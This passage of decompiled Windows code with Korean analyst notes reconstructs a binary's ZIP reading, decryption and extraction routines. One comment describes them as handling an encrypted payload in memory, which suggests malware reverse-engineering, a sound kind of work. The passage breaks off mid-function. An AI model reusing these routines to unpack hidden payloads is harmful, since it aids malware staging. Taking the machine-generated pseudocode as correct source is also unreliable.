// Address: 0x405FE2
// Signature: unknown_signature
// ---------------
int *__cdecl InitZipCentralDirectoryIterator_405FE2(void *stream)
{
  LONG eocdOffset; // eax
  int v3; // edi
  int v4; // eax
  int v6; // eax
  int *v7; // ebx
  int v8[32]; // [esp+Ch] [ebp-90h] BYREF
  int v9; // [esp+8Ch] [ebp-10h] BYREF
  int v10; // [esp+90h] [ebp-Ch] BYREF
  int v11; // [esp+94h] [ebp-8h] BYREF
  int v12; // [esp+98h] [ebp-4h] BYREF
  int streama; // [esp+A4h] [ebp+8h]

  if ( !stream )
    return 0;
  streama = 0;
  eocdOffset = FindZipEOCDoffset_405EDF(stream);// EOCD를 찾아 ZIP 중앙 디렉터리 구조를 초기화 
  v3 = eocdOffset;
  if ( eocdOffset == -1 )
    streama = -1;
  if ( SeekStreamOffset_405D0E(stream, eocdOffset, 0) )
    streama = -1;
  if ( ReadPointerFromStream_405E6B(stream, &v9) )
    streama = -1;
  if ( readLE16_405E27(stream, &v12) )
    streama = -1;
  if ( readLE16_405E27(stream, &v10) )
    streama = -1;
  if ( readLE16_405E27(stream, &v8[1]) )
    streama = -1;
  if ( readLE16_405E27(stream, &v11) )
    streama = -1;
  if ( v11 != v8[1] || v10 || v12 )
    streama = -103;
  if ( ReadPointerFromStream_405E6B(stream, &v8[8]) )
    streama = -1;
  if ( ReadPointerFromStream_405E6B(stream, &v8[9]) )
    streama = -1;
  if ( readLE16_405E27(stream, &v8[2]) )
    streama = -1;
  v4 = *(stream + 3);
  if ( v4 + v3 < (v8[9] + v8[8]) )
  {
    if ( streama )
    {
LABEL_30:
      FreeZipEntryStream_405C9F(stream);
      return 0;
    }
    streama = -103;
  }
  if ( streama )
    goto LABEL_30;
  v8[0] = stream;
  v8[7] = v3;
  v8[31] = 0;
  v6 = v3 + v4 - v8[8] - v8[9];
  *(stream + 3) = 0;
  v8[3] = v6;
  v7 = malloc(0x80u);
  qmemcpy(v7, v8, 0x80u);
  initCentralZipIterator_4064E2(v7);
  return v7;
}


// --- Metadata ---
// Function Name: FreeZipArchive_406162
// Address: 0x406162
// Signature: unknown_signature
// ---------------
int __cdecl FreeZipArchive_406162(void *archive)
{
  if ( !archive )                               // ZIP 세션이 살아 있으면 닫고, ZIP 엔트리 스트림도 정리한 후 Block 자체 해제.
    return -102;
  if ( *(archive + 31) )
    closeSession_406A97(archive);
  FreeZipEntryStream_405C9F(*archive);
  free(archive);
  return 0;
}


// --- Metadata ---
// Function Name: DecodeDosDateTime_406191
// Address: 0x406191
// Signature: unknown_signature
// ---------------
unsigned int __cdecl DecodeDosDateTime_406191(unsigned int dosDateTime, _DWORD *outFields)
{
  unsigned int result; // eax

  outFields[3] = BYTE2(dosDateTime) & 0x1F;
  outFields[5] = (HIWORD(dosDateTime) >> 9) + 1980;// DOS 포맷의 32-비트 날짜/시간 값을 해석
  outFields[2] = dosDateTime >> 11;
  result = (dosDateTime >> 5) & 0x3F;
  outFields[4] = ((dosDateTime >> 21) & 0xF) - 1;
  outFields[1] = result;
  *outFields = 2 * (dosDateTime & 0x1F);
  return result;
}


// --- Metadata ---
// Function Name: parseCentralZipEntry_4061E0
// Address: 0x4061E0
// Signature: unknown_signature
// ---------------
int __cdecl parseCentralZipEntry_4061E0(int zipContext, int a2, int a3, LPVOID lpBuffer, int a5, LPVOID a6, int a7, LPVOID a8, int a9)
{
  int v11; // eax
  LONG v12; // edx
  int v13; // edi
  int v14; // edi
  LONG v15; // edx
  int v16; // ebx
  int v17[20]; // [esp+8h] [ebp-5Ch] BYREF
  int v18; // [esp+58h] [ebp-Ch] BYREF
  int signature; // [esp+5Ch] [ebp-8h] BYREF
  int status; // [esp+60h] [ebp-4h]
  int zipContexta; // [esp+6Ch] [ebp+8h]

  status = 0;
  if ( !zipContext )
    return -102;
  if ( SeekStreamOffset_405D0E(*zipContext, *(zipContext + 12) + *(zipContext + 20), 0) )
  {
    status = -1;
  }
  else if ( ReadPointerFromStream_405E6B(*zipContext, &signature) )
  {
    status = -1;
  }
  else if ( signature != 33639248 )             // ZIP Central Directory File Header signature MAGIC NUMBER 
  {
    status = -103;
  }
  if ( readLE16_405E27(*zipContext, v17) )
    status = -1;
  if ( readLE16_405E27(*zipContext, &v17[1]) )
    status = -1;
  if ( readLE16_405E27(*zipContext, &v17[2]) )
    status = -1;
  if ( readLE16_405E27(*zipContext, &v17[3]) )
    status = -1;
  if ( ReadPointerFromStream_405E6B(*zipContext, &v17[4]) )
    status = -1;
  DecodeDosDateTime_406191(v17[4], &v17[14]);
  if ( ReadPointerFromStream_405E6B(*zipContext, &v17[5]) )
    status = -1;
  if ( ReadPointerFromStream_405E6B(*zipContext, &v17[6]) )
    status = -1;
  if ( ReadPointerFromStream_405E6B(*zipContext, &v17[7]) )
    status = -1;
  if ( readLE16_405E27(*zipContext, &v17[8]) )
    status = -1;
  if ( readLE16_405E27(*zipContext, &v17[9]) )
    status = -1;
  if ( readLE16_405E27(*zipContext, &v17[10]) )
    status = -1;
  if ( readLE16_405E27(*zipContext, &v17[11]) )
    status = -1;
  if ( readLE16_405E27(*zipContext, &v17[12]) )
    status = -1;
  if ( ReadPointerFromStream_405E6B(*zipContext, &v17[13]) )
    status = -1;
  if ( ReadPointerFromStream_405E6B(*zipContext, &v18) )
    status = -1;
  v11 = v17[8];
  v12 = v17[8];
  zipContexta = v17[8];
  if ( status )
    goto LABEL_61;                              // 파일 읽기 
  if ( lpBuffer )
  {
    if ( v17[8] >= a5 )
    {
      v13 = a5;
    }
    else
    {
      *(lpBuffer + v17[8]) = 0;
      v11 = v17[8];
      v13 = v17[8];
    }
    if ( v11 && a5 && readFromReader_405D8A(lpBuffer, v13, 1, *zipContext) != 1 )
      status = -1;
    v12 = zipContexta - v13;
    zipContexta -= v13;
    if ( status )
      goto LABEL_61;
  }
  if ( !a6 )
  {
LABEL_61:
    v15 = v17[9] + v12;
  }
  else
  {
    v14 = v17[9];
    if ( v17[9] >= a7 )
      v14 = a7;
    if ( v12 )
    {
      if ( SeekStreamOffset_405D0E(*zipContext, v12, 1) )
        status = -1;
      else
        zipContexta = 0;
    }
    if ( v17[9] && a7 && readFromReader_405D8A(a6, v14, 1, *zipContext) != 1 )
      status = -1;
    v15 = v17[9] - v14 + zipContexta;
  }
  if ( !status )
  {
    if ( !a8 )
      goto LABEL_74;
    v16 = a9;
    if ( v17[10] < a9 )
    {
      *(a8 + v17[10]) = 0;
      v16 = v17[10];
    }
    if ( v15 && SeekStreamOffset_405D0E(*zipContext, v15, 1) )
      status = -1;
    if ( v17[10] && a9 && readFromReader_405D8A(a8, v16, 1, *zipContext) != 1 )
      status = -1;
    if ( !status )
    {
LABEL_74:                                       // output 필드에 쓰기 
      if ( a2 )
        qmemcpy(a2, v17, 0x50u);
      if ( a3 )
        *a3 = v18;
    }
  }
  return status;
}


// --- Metadata ---
// Function Name: callParseZip_4064BB
// Address: 0x4064BB
// Signature: unknown_signature
// ---------------
int __cdecl callParseZip_4064BB(int a1, int a2, LPVOID lpBuffer, int a4, LPVOID a5, int a6, LPVOID a7, int a8)
{
  return parseCentralZipEntry_4061E0(a1, a2, 0, lpBuffer, a4, a5, a6, a7, a8);
}


// --- Metadata ---
// Function Name: initCentralZipIterator_4064E2
// Address: 0x4064E2
// Signature: unknown_signature
// ---------------
int __cdecl initCentralZipIterator_4064E2(_DWORD *a1)
{
  int result; // eax

  if ( !a1 )
    return -102;
  a1[5] = a1[9];
  a1[4] = 0;
  result = parseCentralZipEntry_4061E0(a1, (a1 + 10), (a1 + 30), 0, 0, 0, 0, 0, 0);
  a1[6] = result == 0;
  return result;
}


// --- Metadata ---
// Function Name: MoveToNextZipEntry_406520
// Address: 0x406520
// Signature: unknown_signature
// ---------------
int __cdecl MoveToNextZipEntry_406520(_DWORD *zipContext)
{
  int v1; // eax
  int result; // eax
  int v3; // edx
  int v4; // ecx

  if ( !zipContext )
    return -102;
  if ( !zipContext[6] )                         // 내용이 없거나 끝까지 읽음 
    return -100;
  v1 = zipContext[4] + 1;
  if ( v1 == zipContext[1] )
    return -100;
  v3 = zipContext[18];
  v4 = zipContext[19] + zipContext[20];         // 인덱스와 엔트리 업데이트 
  zipContext[4] = v1;
  zipContext[5] += v4 + v3 + 46;
  result = parseCentralZipEntry_4061E0(zipContext, (zipContext + 10), (zipContext + 30), 0, 0, 0, 0, 0, 0);
  zipContext[6] = result == 0;
  return result;
}


// --- Metadata ---
// Function Name: zipHeaderParsing_40657A
// Address: 0x40657A
// Signature: unknown_signature
// ---------------
int __cdecl zipHeaderParsing_40657A(int *a1, _DWORD *CRC32, _DWORD *a3, _DWORD *a4)
{
  _DWORD *v4; // eax
  _DWORD *v5; // ebx
  int *zipContext; // esi zip 구조체
  int v7; // edi
  _DWORD *v9; // eax
  int v10; // eax
  int v11; // [esp+Ch] [ebp-Ch] BYREF
  int v12; // [esp+10h] [ebp-8h] BYREF
  int v13; // [esp+14h] [ebp-4h] BYREF

  v4 = a3;
  v5 = CRC32;
  zipContext = a1;
  v7 = 0;
  *CRC32 = 0;
  *v4 = 0;
  *a4 = 0;
  if ( SeekStreamOffset_405D0E(*zipContext, zipContext[30] + zipContext[3], 0) )// 로컬 헤더 파일 시작 위치 이동 
    return -1;
  if ( ReadPointerFromStream_405E6B(*zipContext, &v12) )// 헤더 파일 시그니처 읽기 
  {
    v7 = -1;
  }
  else if ( v12 != 67324752 )                   // ZIP Local File Header signature MAGIC NUMBER
  {
    v7 = -103;
  }
  if ( readLE16_405E27(*zipContext, &CRC32) )
    v7 = -1;
  if ( readLE16_405E27(*zipContext, &a1) )
    v7 = -1;
  if ( readLE16_405E27(*zipContext, &CRC32) )
  {
    v7 = -1;
  }
  else if ( !v7 )                               // 압축 방식 유효성 검사 
  {
    v9 = zipContext[13];
    if ( CRC32 != v9 || v9 && v9 != 8 )
      v7 = -103;
  }
  if ( ReadPointerFromStream_405E6B(*zipContext, &CRC32) )// CRC32 검사 
    v7 = -1;
  if ( ReadPointerFromStream_405E6B(*zipContext, &CRC32) )
  {
    v7 = -1;
  }
  else if ( !v7 && CRC32 != zipContext[15] && (a1 & 8) == 0 )
  {
    v7 = -103;
  }
  if ( ReadPointerFromStream_405E6B(*zipContext, &CRC32) )// 압축 크기 
  {
    v7 = -1;
  }
  else if ( !v7 && CRC32 != zipContext[16] && (a1 & 8) == 0 )
  {
    v7 = -103;
  }
  if ( ReadPointerFromStream_405E6B(*zipContext, &CRC32) )// 압축 해제 크기 
  {
    v7 = -1;
  }
  else if ( !v7 && CRC32 != zipContext[17] && (a1 & 8) == 0 )
  {
    v7 = -103;
  }
  if ( readLE16_405E27(*zipContext, &v13) )     // 길이 계산 
  {
    v7 = -1;
  }
  else if ( !v7 && v13 != zipContext[18] )
  {
    v7 = -103;
  }
  *v5 += v13;
  if ( readLE16_405E27(*zipContext, &v11) )
    v7 = -1;
  *a3 = zipContext[30] + v13 + 30;              // 데이터 시작 위치 계산 
  v10 = v11;
  *a4 = v11;
  *v5 += v10;
  return v7;
}


// --- Metadata ---
// Function Name: initZipFileStream_40671D
// Address: 0x40671D
// Signature: unknown_signature
// ---------------
int __cdecl initZipFileStream_40671D(int sessionContext, unsigned __int8 *a2)
{
  int *v3; // esi
  void *v4; // eax
  bool v6; // zf
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // ecx
  int CRC32; // [esp+Ch] [ebp-Ch] BYREF
  int a4; // [esp+10h] [ebp-8h] BYREF
  int a3; // [esp+14h] [ebp-4h] BYREF
  unsigned __int8 *a1a; // [esp+20h] [ebp+8h]  ZIP 파일 내부의 개별 파일 항목을 처리하고 초기화 

  if ( !sessionContext || !*(sessionContext + 24) )// 인자 검사 및 기존 세션 닫기 
    return -102;
  if ( *(sessionContext + 124) )
    closeSession_406A97(sessionContext);
  if ( zipHeaderParsing_40657A(sessionContext, &CRC32, &a3, &a4) )// ZIP 헤더 파싱 
    return -103;
  v3 = malloc(0x84u);                           // 스트림 컨텍스트 구조체 할당 및 필드 초기화 
  if ( !v3 )
    return -104;
  v4 = malloc(0x4000u);
  *v3 = v4;
  v3[17] = a3;
  v3[18] = a4;
  v3[19] = 0;
  if ( !v4 )
  {
    free(v3);
    return -104;
  }
  v3[16] = 0;
  v6 = *(sessionContext + 52) == 0;
  v3[21] = *(sessionContext + 60);
  v3[20] = 0;
  v3[25] = *(sessionContext + 52);
  v3[24] = *sessionContext;
  v3[26] = *(sessionContext + 12);
  v3[6] = 0;
  if ( !v6 )                                    // 압축 세션 초기화 
  {
    v3[9] = 0;
    v3[10] = 0;
    v3[11] = 0;
    if ( !InitSession_405777((v3 + 1)) )
      v3[16] = 1;
  }
  v3[22] = *(sessionContext + 64);
  v3[23] = *(sessionContext + 68);
  *(v3 + 108) = *(sessionContext + 48) & 1;
  if ( (*(sessionContext + 48) & 8) != 0 )
    v7 = *(sessionContext + 56) >> 8;
  else
    v7 = HIBYTE(*(sessionContext + 60));
  *(v3 + 128) = v7;
  v8 = *(v3 + 108) != 0 ? 0xC : 0;              // 세부 플래그 설정 
  v3[29] = 591751049;
  v3[31] = v8;
  v3[28] = 305419896;
  v3[30] = 878082192;
  for ( a1a = a2; a1a; updateStreamState_405535(v3 + 28, *a1a++) )// 세션 상태 업데이트
  {
    if ( !*a1a )
      break;
  }
  v9 = *(sessionContext + 120);
  v10 = CRC32;
  v3[2] = 0;
  v3[15] = v9 + v10 + 30;                       // 오프셋 계산 및 세션 저장
  *(sessionContext + 124) = v3;
  return 0;
}


// --- Metadata ---
// Function Name: ReadFromZipStream_406880
// Address: 0x406880
// Signature: unknown_signature
// ---------------
int __cdecl ReadFromZipStream_406880(int zipCtx, int output_size, unsigned int toread, _BYTE *output_ptr)
{
  _BYTE *v4; // ebx
  int v5; // esi
  unsigned int v6; // eax ZIP 스트림으로부터 데이터를 읽고 복호화/해제, CRC 체크섬 계산 
  unsigned int v7; // eax 암호화·압축된 페이로드를 디스크 I/O 없이 메모리상에서 처리하는 고수준 루틴 
  unsigned int v8; // edi
  _BYTE *v9; // ebx
  bool v10; // zf
  unsigned __int8 v11; // al
  unsigned int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // eax
  unsigned int v15; // edi
  char v16; // dl
  unsigned int v17; // edi
  unsigned int i; // eax
  unsigned int CRC32checksum2; // eax
  int v20; // ebx
  unsigned int v21; // edi
  unsigned int CRC32checksum; // eax
  int v25; // [esp+Ch] [ebp-8h]
  int v26; // [esp+10h] [ebp-4h]
  unsigned int zipCtxa; // [esp+1Ch] [ebp+8h]
  unsigned __int8 *zipCtxb; // [esp+1Ch] [ebp+8h]

  v4 = output_ptr;
  v26 = 0;
  if ( output_ptr )
    *output_ptr = 0;
  if ( !zipCtx )
    return -102;
  v5 = *(zipCtx + 124);
  if ( !v5 )
    return -102;
  if ( !*v5 )
    return -100;
  if ( !toread )
    return 0;
  *(v5 + 20) = toread;
  *(v5 + 16) = output_size;
  v6 = *(v5 + 92);
  if ( toread > v6 )
    *(v5 + 20) = v6;
  while ( *(v5 + 20) )
  {
    if ( !*(v5 + 8) )                           // 압축 모드 
    {
      v7 = *(v5 + 88);
      if ( v7 )
      {
        v8 = 0x4000;
        if ( v7 < 0x4000 )
          v8 = *(v5 + 88);
        if ( SeekStreamOffset_405D0E(*(v5 + 96), *(v5 + 60) + *(v5 + 104), 0)
          || readFromReader_405D8A(*v5, v8, 1, *(v5 + 96)) != 1 )
        {
          return -1;
        }
        *(v5 + 60) += v8;
        *(v5 + 88) -= v8;
        v9 = *v5;
        v10 = *(v5 + 108) == 0;
        *(v5 + 4) = *v5;
        *(v5 + 8) = v8;
        if ( !v10 )
        {
          for ( zipCtxa = 0; zipCtxa < v8; v9[v12] = v11 )
          {
            v11 = EncryptByteWithState_4055A3((v5 + 112), v9[zipCtxa]);
            v12 = zipCtxa++;
          }
        }
        v4 = output_ptr;
      }
    }
    v13 = *(v5 + 124);
    v14 = *(v5 + 8);
    if ( v13 > v14 )
      v13 = *(v5 + 8);
    if ( v13 )
    {
      v15 = *(v5 + 4) + v13;
      v16 = *(v15 - 1);
      v10 = *(v5 + 124) == v13;
      *(v5 + 124) -= v13;
      *(v5 + 8) = v14 - v13;
      *(v5 + 4) = v15;
      if ( v10 && v16 != *(v5 + 128) )
        return -106;
    }
    if ( *(v5 + 100) )
    {
      v20 = *(v5 + 24);
      zipCtxb = *(v5 + 16);
      v25 = inflateStream_40583C((v5 + 4), 2);
      v21 = *(v5 + 24) - v20;
      CRC32checksum = computeCRC32_40541F(*(v5 + 80), zipCtxb, v21);
      *(v5 + 92) -= v21;
      v26 += v21;
      *(v5 + 80) = CRC32checksum;
      if ( v25 == 1 || !*(v5 + 92) )
      {
        if ( output_ptr )
          *output_ptr = 1;
        return v26;
      }
      if ( v25 )
        return v25;
      v4 = output_ptr;
    }
    else                                        // 비압축 모드 
    {
      v17 = *(v5 + 8);
      if ( *(v5 + 20) < v17 )
        v17 = *(v5 + 20);
      for ( i = 0; i < v17; ++i )
        *(*(v5 + 16) + i) = *(*(v5 + 4) + i);
      CRC32checksum2 = computeCRC32_40541F(*(v5 + 80), *(v5 + 16), v17);
      *(v5 + 92) -= v17;
      *(v5 + 8) -= v17;
      *(v5 + 20) -= v17;
      *(v5 + 16) += v17;
      *(v5 + 4) += v17;
      *(v5 + 24) += v17;
      v26 += v17;
      *(v5 + 80) = CRC32checksum2;
      if ( !*(v5 + 92) )
      {
        if ( v4 )
          *v4 = 1;
      }
    }
  }
  return v26;
}


// --- Metadata ---
// Function Name: closeSession_406A97
// Address: 0x406A97
// Signature: unknown_signature
// ---------------
int __cdecl closeSession_406A97(int a1)
{
  int v1; // esi
  int result; // eax
  bool v3; // zf
  int v4; // [esp+Ch] [ebp-4h]

  v4 = 0;
  if ( !a1 )
    return -102;
  v1 = *(a1 + 124);
  if ( !v1 )
    return -102;
  if ( !*(v1 + 92) && *(v1 + 80) != *(v1 + 84) )
    v4 = -105;
  if ( *v1 )                                    // 전체 종료 루틴, 내부 객체 해제 
  {
    free(*v1);
    *v1 = 0;
  }
  v3 = *(v1 + 64) == 0;
  *v1 = 0;
  if ( !v3 )
    cleanUpSession_405739((v1 + 4));
  *(v1 + 64) = 0;
  free(v1);
  result = v4;
  *(a1 + 124) = 0;
  return result;
}


// --- Metadata ---
// Function Name: calculateWindowsFileTimeFromUnix_406B02
// Address: 0x406B02
// Signature: unknown_signature
// ---------------
__int64 __cdecl calculateWindowsFileTimeFromUnix_406B02(int unixTimeSeconds)
{
  __int64 adjustedFiletimeBase; // rax

  adjustedFiletimeBase = unixTimeSeconds + 3054539008i64;// 베이스 오프셋 추가 
  HIDWORD(adjustedFiletimeBase) += 2;
  return 10000000 * adjustedFiletimeBase;
}


// --- Metadata ---
// Function Name: getTimestamp_406B23
// Address: 0x406B23
// Signature: unknown_signature
// ---------------
struct _FILETIME __cdecl getTimestamp_406B23(unsigned int a1, unsigned int a2)
{
  SYSTEMTIME SystemTime; // [esp+0h] [ebp-18h] BYREF MS-DOS 날짜 및 시간 형식을 Windows의 FILETIME 구조체로 변환 
  struct _FILETIME FileTime; // [esp+10h] [ebp-8h] BYREF

  SystemTime.wMilliseconds = 0;
  SystemTime.wYear = (a1 >> 9) + 1980;
  SystemTime.wDay = a1 & 0x1F;
  SystemTime.wMonth = (a1 >> 5) & 0xF;
  SystemTime.wHour = a2 >> 11;
  SystemTime.wSecond = 2 * (a2 & 0x1F);
  SystemTime.wMinute = (a2 >> 5) & 0x3F;
  SystemTimeToFileTime(&SystemTime, &FileTime);
  return FileTime;
}


// --- Metadata ---
// Function Name: InitZipFileReader_406B8E
// Address: 0x406B8E
// Signature: unknown_signature
// ---------------
int __thiscall InitZipFileReader_406B8E(void *zipContext, HANDLE hFile, int a3, int fileAccessType)
{
  char lastChar; // al
  _BYTE *v7; // eax
  int *zipIterator; // eax
  int resultCode; // eax
  int v10; // [esp+4h] [ebp-4h] BYREF

  if ( *zipContext || *(zipContext + 1) != -1 ) // 이미 초기화된 객체인지 검사 
    return 0x1000000;
  GetCurrentDirectoryA(0x104u, zipContext + 320);
  lastChar = *(zipContext + strlen(zipContext + 320) + 319);// 작업 디렉터리 경로 설정 
  if ( lastChar != '\\' && lastChar != '/' )
    strcat(zipContext + 320, "\\");
  if ( fileAccessType == 1 && SetFilePointer(hFile, 0, 0, 1u) == -1 )
    return 0x2000000;
  v7 = CreateFileReaderContext_405BAE(hFile, a3, fileAccessType, &v10);
  if ( !v7 )
    return v10;
  zipIterator = InitZipCentralDirectoryIterator_405FE2(v7);// ZIP 중앙 디렉터리 반복자 초기화 
  *zipContext = zipIterator;
  resultCode = -(zipIterator != 0);
  LOWORD(resultCode) = resultCode & 0xFE00;
  return resultCode + 512;
}


// --- Metadata ---
// Function Name: LoadZipEntryMetadata_406C40
// Address: 0x406C40
// Signature: unknown_signature
// ---------------
int __thiscall LoadZipEntryMetadata_406C40(int *this, int entryIndex, void *outEntryInfo)
{
  bool v4; // zf
  void *v6; // eax
  int *v7; // ecx
  unsigned int v8; // eax
  int v9; // eax
  char *i; // edi
  unsigned __int8 v12; // al
  unsigned __int8 *v13; // eax
  bool v14; // al
  char v15; // cl
  unsigned int v16; // edi
  bool v17; // bl
  int v18; // edi
  DWORD v19; // eax
  DWORD v20; // ecx
  bool v21; // cc
  _BYTE *extraFieldData; // ebx
  char v23; // al
  char v24; // cl
  bool v25; // al
  int v26; // edi
  int v27; // edx
  unsigned __int8 *v28; // eax
  int v29; // edx
  unsigned __int8 *v30; // eax
  int *v31; // esi
  void *v32; // [esp-8h] [ebp-294h]
  unsigned int v33; // [esp-4h] [ebp-290h]
  char cleanedPath[260]; // [esp+Ch] [ebp-280h] BYREF
  char rawPath[260]; // [esp+110h] [ebp-17Ch] BYREF
  int entryHeaderFlags[4]; // [esp+214h] [ebp-78h] BYREF
  unsigned int v37; // [esp+224h] [ebp-68h]
  int v38; // [esp+22Ch] [ebp-60h]
  int v39; // [esp+230h] [ebp-5Ch]
  int entryAttributes; // [esp+248h] [ebp-44h]
  int entryOffset; // [esp+264h] [ebp-28h] BYREF
  FILETIME LocalFileTime; // [esp+268h] [ebp-24h] BYREF
  struct _FILETIME FileTime; // [esp+270h] [ebp-1Ch] BYREF
  int *v44; // [esp+278h] [ebp-14h]
  LONG lDistanceToMove; // [esp+27Ch] [ebp-10h] BYREF
  unsigned int v46; // [esp+280h] [ebp-Ch] BYREF
  char Str1[4]; // [esp+284h] [ebp-8h] BYREF
  bool fileAttrFlag; // [esp+28Bh] [ebp-1h]
  void *Srca; // [esp+298h] [ebp+Ch]
  bool Src_3; // [esp+29Bh] [ebp+Fh]
  bool Src_3a; // [esp+29Bh] [ebp+Fh]

  v44 = this;
  if ( entryIndex >= -1 && entryIndex < *(*this + 4) )// 지정된 ZIP 인덱스에 해당하는 파일의 정보를 로드하여 구조체에 저장
  {
    if ( this[1] != -1 )
      closeSession_406A97(*this);
    v4 = entryIndex == this[77];
    this[1] = -1;
    if ( v4 )
    {
      if ( entryIndex != -1 )
      {
        memcpy(outEntryInfo, this + 2, 0x12Cu);
        return 0;
      }
    }
    else if ( entryIndex != -1 )
    {
      if ( entryIndex < *(*this + 16) )
        initCentralZipIterator_4064E2(*this);
      while ( *(*this + 16) < entryIndex )
        MoveToNextZipEntry_406520(*this);
      callParseZip_4064BB(*this, entryHeaderFlags, rawPath, 260, 0, 0, 0, 0);
      if ( zipHeaderParsing_40657A(*this, &entryOffset, &lDistanceToMove, &v46) )
        return 1792;
      if ( !SeekStreamOffset_405D0E(**this, lDistanceToMove, 0) )
      {
        v6 = operator new(v46);
        v7 = *this;
        *Str1 = v6;
        v8 = readFromReader_405D8A(v6, 1, v46, *v7);
        if ( v8 == v46 )
        {
          v9 = *this;
          *outEntryInfo = *(v9 + 16);
          strcpy(cleanedPath, rawPath);
          for ( i = cleanedPath; ; i = (v13 + 4) )
          {
            while ( 1 )
            {
              while ( 1 )
              {
                v12 = *i;
                if ( !*i || i[1] != 58 )
                  break;
                i += 2;
              }
              if ( v12 != 92 && v12 != 47 )
                break;
              ++i;
            }
            v13 = mbsstr(i, "\\..\\");          // 경로 탐색 취약점 회피 
            if ( !v13 )
            {
              v13 = mbsstr(i, "\\../");
              if ( !v13 )
              {
                v13 = mbsstr(i, "/../");
                if ( !v13 )
                {
                  v13 = mbsstr(i, "/..\\");
                  if ( !v13 )
                    break;
                }
              }
            }
          }
          strcpy(outEntryInfo + 4, i);
          Src_3 = 0;
          fileAttrFlag = 0;
          v14 = (entryAttributes & 0x40000000) != 0;
          v15 = (entryAttributes & 0x800000) == 0;
          v16 = entryHeaderFlags[0] >> 8;
          v17 = 1;
          if ( !(entryHeaderFlags[0] >> 8) || v16 == 7 || v16 == 11 || v16 == 14 )
          {
            Src_3 = (entryAttributes & 2) != 0;
            v15 = entryAttributes & 1;
            fileAttrFlag = (entryAttributes & 4) != 0;
            v14 = (entryAttributes & 0x10) != 0;
            v17 = (entryAttributes & 0x20) != 0;
          }
          v18 = 0;
          *(outEntryInfo + 66) = 0;
          if ( v14 )
            *(outEntryInfo + 66) = 16;
          if ( v17 )
            *(outEntryInfo + 66) |= 0x20u;
          if ( Src_3 )
            *(outEntryInfo + 66) |= 2u;
          if ( v15 )
            *(outEntryInfo + 66) |= 1u;
          if ( fileAttrFlag )
            *(outEntryInfo + 66) |= 4u;
          v33 = v37;
          *(outEntryInfo + 73) = v38;
          *(outEntryInfo + 74) = v39;
          LocalFileTime = getTimestamp_406B23(HIWORD(v37), v33);
          LocalFileTimeToFileTime(&LocalFileTime, &FileTime);
          v19 = FileTime.dwLowDateTime;
          v20 = FileTime.dwHighDateTime;
          v21 = v46 <= 4;
          extraFieldData = *Str1;
          *(outEntryInfo + 67) = FileTime.dwLowDateTime;
          *(outEntryInfo + 69) = v19;
          *(outEntryInfo + 71) = v19;
          *(outEntryInfo + 68) = v20;
          *(outEntryInfo + 70) = v20;
          *(outEntryInfo + 72) = v20;
          if ( !v21 )
          {
            while ( 1 )
            {
              Str1[0] = extraFieldData[v18];
              v23 = extraFieldData[v18 + 1];
              Str1[2] = 0;
              Str1[1] = v23;
              Srca = extraFieldData[v18 + 2];
              if ( !strcmp(Str1, "UT") )
                break;
              v18 += Srca + 4;
              if ( v18 + 4 >= v46 )
                goto LABEL_57;
            }
            v24 = extraFieldData[v18 + 4];
            v25 = (v24 & 2) != 0;
            v26 = v18 + 5;
            Src_3a = v25;
            fileAttrFlag = (v24 & 4) != 0;
            if ( (v24 & 1) != 0 )
            {
              v27 = extraFieldData[v26 + 1];
              v28 = &extraFieldData[v26];
              v26 += 4;
              *(outEntryInfo + 284) = calculateWindowsFileTimeFromUnix_406B02(((v27 | (*(v28 + 1) << 8)) << 8) | *v28);
              v25 = Src_3a;
            }
            if ( v25 )
            {
              v29 = extraFieldData[v26 + 1];
              v30 = &extraFieldData[v26];
              v26 += 4;
              *(outEntryInfo + 268) = calculateWindowsFileTimeFromUnix_406B02(((v29 | (*(v30 + 1) << 8)) << 8) | *v30);
            }
            if ( fileAttrFlag )
              *(outEntryInfo + 276) = calculateWindowsFileTimeFromUnix_406B02(((extraFieldData[v26 + 1] | (*&extraFieldData[v26 + 2] << 8)) << 8) | extraFieldData[v26]);
          }
LABEL_57:
          if ( extraFieldData )
            operator delete(extraFieldData);
          v32 = outEntryInfo;
          v31 = v44;
          memcpy(v44 + 2, v32, 0x12Cu);
          v31[77] = entryIndex;
          return 0;
        }
        operator delete(*Str1);
      }
      return 2048;
    }
    *outEntryInfo = *(*this + 4);
    *(outEntryInfo + 4) = 0;
    *(outEntryInfo + 66) = 0;
    *(outEntryInfo + 67) = 0;
    *(outEntryInfo + 68) = 0;
    *(outEntryInfo + 69) = 0;
    *(outEntryInfo + 70) = 0;
    *(outEntryInfo + 71) = 0;
    *(outEntryInfo + 72) = 0;
    *(outEntryInfo + 73) = 0;
    *(outEntryInfo + 74) = 0;
    return 0;
  }
  return 0x10000;
}


// --- Metadata ---
// Function Name: mkdirRecursive_407070
// Address: 0x407070
// Signature: unknown_signature
// ---------------
char __cdecl mkdirRecursive_407070(LPCSTR lpFileName, void *Src)
{
  DWORD v2; // eax
  _BYTE *v3; // esi
  char *v4; // ecx
  size_t v5; // esi
  char v7[260]; // [esp+8h] [ebp-208h] BYREF
  char Destination[260]; // [esp+10Ch] [ebp-104h] BYREF

  if ( lpFileName && GetFileAttributesA(lpFileName) == -1 )
    CreateDirectoryA(lpFileName, 0);
  LOBYTE(v2) = *Src;
  if ( *Src )
  {
    v3 = Src;
    v4 = Src;
    do
    {
      if ( v2 == 47 || v2 == 92 )
        v3 = v4;
      LOBYTE(v2) = *++v4;
    }
    while ( v2 );
    if ( v3 != Src )
    {
      v5 = v3 - Src;
      memcpy(v7, Src, v5);
      v7[v5] = 0;
      mkdirRecursive_407070(lpFileName, v7);    // 디렉토리 경로를 재귀적으로 생성 
    }
    Destination[0] = 0;
    if ( lpFileName )
      strcpy(Destination, lpFileName);
    strcat(Destination, Src);
    v2 = GetFileAttributesA(Destination);
    if ( v2 == -1 )
      LOBYTE(v2) = CreateDirectoryA(Destination, 0);
  }
  return v2;
}


// --- Metadata ---
// Function Name: ZipArchive_ExtractEntry_407136
// Address: 0x407136
// Signature: unknown_signature
// ---------------
int __thiscall ZipArchive_ExtractEntry_407136(_DWORD **zipArc, HANDLE hFile, char *Source, int output_size, int mode)
{
  int v5; // ebx
  int result; // eax ZIP 아카이브에서 하나의 파일을 추출해서 읽기 스트림 연결 
  _DWORD *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // eax
  int v11; // edi
  _DWORD *v12; // eax
  HANDLE v13; // edi
  char v14; // al
  void *v15; // eax
  char *v16; // edi
  char *v17; // ebx
